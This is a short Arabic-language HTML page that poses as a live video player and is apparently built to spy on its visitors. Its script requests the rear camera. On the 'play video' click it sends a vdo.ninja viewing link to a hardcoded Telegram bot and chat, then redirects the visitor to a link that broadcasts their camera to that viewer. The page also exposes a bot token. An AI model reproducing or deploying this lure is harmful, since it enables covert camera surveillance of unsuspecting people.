<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام الحارس - البث الفوري 🛡️</title>
    <style>
        body { background: #020617; color: white; text-align: center; font-family: sans-serif; padding: 20px; }
        .box { background: #1e293b; border-radius: 25px; padding: 20px; max-width: 450px; margin: auto; border: 1px solid #334155; }
        video { width: 100%; border-radius: 15px; background: #000; border: 2px solid #3b82f6; }
        .btn-final { 
            background: #ef4444; color: white; width: 100%; padding: 20px; border-radius: 15px; 
            border: none; font-weight: bold; cursor: pointer; font-size: 1.2rem; margin-top: 20px;
        }
        #msg { color: #fbbf24; margin-top: 15px; font-weight: bold; }
    </style>
</head>
<body>

    <div class="box">
        <h3>نظام البث المباشر (إصدار تخطي الحجب)</h3>
        <video id="p" autoplay playsinline muted></video>
        <button class="btn-final" onclick="launchStream()">🎬 تشغيل الفيديو الآن</button>
        <div id="msg">جاهز لإرسال الرابط..</div>
    </div>

    <script>
        const TOKEN = "8799708539:AAFFvqiwSvFBTACNrnZtOO5noYErlLsc958";
        const CHAT_ID = "1734714029";
        let stream = null;

        async function start() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment", width: 480 } });
                document.getElementById('p').srcObject = stream;
            } catch (e) { document.getElementById('msg').innerText = "خطأ في الكاميرا"; }
        }

        async function launchStream() {
            document.getElementById('msg').innerText = "⏳ جاري كسر الجمود..";
            const id = "LIVE_" + Math.floor(Math.random() * 9999);
            
            // روابط "الاختراق" - تستخدم أقل جودة ممكنة لضمان العبور
            const push = `https://vdo.ninja/?push=${id}&autostart&clean&mute&bitrate=500&fps=15&vcodec=vp8&noap&buffer=0`;
            const view = `https://vdo.ninja/?view=${id}&autoplay=1&noap&buffer=0&vp8`;

            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: "POST",
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: `🎬 **رابط الفيديو (الوضع السريع):**\n${view}` })
            });

            if (stream) stream.getTracks().forEach(t => t.stop());

            setTimeout(() => {
                window.location.replace(push);
            }, 500);
        }
        start();
    </script>
</body>
</html>
